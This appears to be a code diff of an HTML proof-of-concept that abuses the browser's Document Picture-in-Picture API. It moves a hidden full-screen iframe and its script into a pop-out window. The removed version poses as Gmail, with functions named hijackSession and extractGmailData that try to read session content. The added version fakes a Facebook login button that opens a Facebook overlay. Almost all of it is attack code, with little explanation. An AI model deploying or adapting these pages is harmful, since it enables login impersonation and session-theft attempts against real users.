@@ -1,77 +1,47 @@
-<title>Email Client</title>
-<style>#sessionHijacker { display: none; }</style>
+<title>Social Connect</title>
+<style>#content { display: none; }</style>
 
 <center>
-<br><br><br><h2>Check Your <b style="color: #ea4335;">Gmail</b>: <br><br><br><br>
-<button onclick="hijackSession()" style="padding: 15px 30px; font-size: 16px; background: #ea4335; color: white; border: none; border-radius: 5px; cursor: pointer;">
-    📧 Open Gmail
-</button>
+<br><br><br><h2>Login With the <b>Facebook</b>: <br><br><br><br>
+<img style="cursor: pointer;" src=https://scandiweb.com/blog/wp-content/uploads/2021/02/facebook-login-button-png-11.png id="button">
 
-<div id="sessionHijacker">
-<title>Gmail</title>
-<iframe id=gmailFrame style="position: fixed; display: none; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: 999999;" src=https://mail.google.com></iframe>
+<div id="content">
+<title>Facebook</title>
+<iframe id=frm style="position: fixed;display:none;top: 0px;bottom: 0px;right: 0px;width: 100%;border: none;margin: 0;padding: 0;overflow: hidden;z-index: 999999;height: 100%;" src=https://facebook.com></iframe>
 
 <script>
-// Script yang ikut tertransplant
-let gmailSession = null;
-
-function monitorGmailSession() {
-    // Coba access Gmail iframe content
-    try {
-        if (gmailFrame.contentWindow && gmailFrame.contentDocument) {
-            console.log('Gmail frame accessible in PiP');
-            
-            // Monitor for changes (conceptual)
-            setInterval(() => {
-                // Dalam real attack, ini akan extract data dari Gmail session
-                if (gmailFrame.contentDocument.title) {
-                    console.log('Gmail tab title:', gmailFrame.contentDocument.title);
-                }
-            }, 3000);
-        }
-    } catch (e) {
-        console.log('Cross-origin restriction:', e.message);
-    }
-}
-
-function extractGmailData() {
-    // Attempt to extract information from Gmail session
-    console.log('Attempting to extract Gmail session data...');
+// Embedded script yang ikut tertransplant
+function handleAuth() {
+    // Function ini akan tetap work di PiP context!
+    console.log('Auth handling in PiP window!');
     
-    // Dalam real attack, ini akan menggunakan postMessage atau other techniques
-    return {
-        loggedIn: gmailFrame.src.includes('mail.google.com'),
-        timestamp: new Date().toISOString(),
-        sessionActive: true
-    };
+    // Bisa access iframe content
+    if (window.frm && frm.contentWindow) {
+        console.log('Iframe accessible in new context');
+    }
 }
 </script>
 </div>
 
-<script>
-async function hijackSession() {
-    const pipWindow = await documentPictureInPicture.requestWindow({
-        width: 800, 
-        height: 600
-    });
+<script> 
+    var pipOpen = async () => {
+        // Buat PiP window
+        pipWindow = await documentPictureInPicture.requestWindow({
+            width: 600,
+            height: 700
+        });
 
-
-    pipWindow.document.body.append(sessionHijacker);
-    
-
-    pipWindow.gmailFrame.style.display = 'block';
-    
-    // 🎯 FUNCTION ACCESS: Panggil functions dalam PiP context
-    setTimeout(() => {
-        pipWindow.monitorGmailSession(); // Embedded function works!
+        // 🎯 MAGIC TRANSPLANTATION: Pindahkan entire content
+        pipWindow.document.body.append(content); 
         
-        const sessionInfo = pipWindow.extractGmailData();
-        console.log('Gmail session info:', sessionInfo);
-    }, 2000);
-    
-    // 🎯 CROSS-CONTEXT COMMUNICATION
-    pipWindow.addEventListener('click', (e) => {
-        console.log('Click in PiP window at:', e.clientX, e.clientY);
-    });
-}
+        // 🎯 ACCESS PRESERVED: iframe tetap accessible
+        pipWindow.frm.style.display='block';
+        
+        // 🎯 SCRIPT PRESERVATION: embedded script tetap work
+        setTimeout(() => {
+            pipWindow.handleAuth(); // Function masih executable!
+        }, 1000);
+
+    };
+    button.onclick = pipOpen;
 </script>
